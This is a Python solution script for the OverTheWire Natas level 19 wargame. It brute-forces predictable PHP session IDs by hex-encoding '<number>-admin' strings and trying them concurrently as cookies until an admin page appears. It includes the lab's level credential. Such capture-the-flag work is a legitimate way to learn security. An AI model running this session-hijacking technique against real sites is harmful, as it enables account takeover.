#!/usr/bin/python3
# Time: 2019/04/23 2:54 PM

from gevent import monkey
monkey.patch_all()

import os
import time
import gevent
from gevent import pool
import re
import requests
import base64
import codecs


username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
url = f'http://{username}.natas.labs.overthewire.org/'
s = requests.Session()

# resp = s.post(url, auth=(username, password), data={"username": "please", "password": "subscribe"})
# print(resp.text)
# print(s.cookies)

for i in range(50, 200):
    ...


def go(num):
    # g = str(codecs.encode(b"%d-admin" % i, "hex"))
    g = codecs.encode(b"%d-admin" % num, "hex").decode('utf-8')
    resp = s.get(url, auth=(username, password), data={"username": "admin", "password": "subscribe"},cookies={"PHPSESSID": g})
    # print(resp.text)
    if "regular" not in resp.text:
        print("this is the one !", num)
        print(resp.text)
    else:
        print("tring : ", num, g)


def main():
    poo = pool.Pool(10)
    jobs = []
    for j in range(1, 640):
        jobs.append(poo.spawn(go, j))
    gevent.joinall(jobs)


if __name__ == '__main__':
    main()

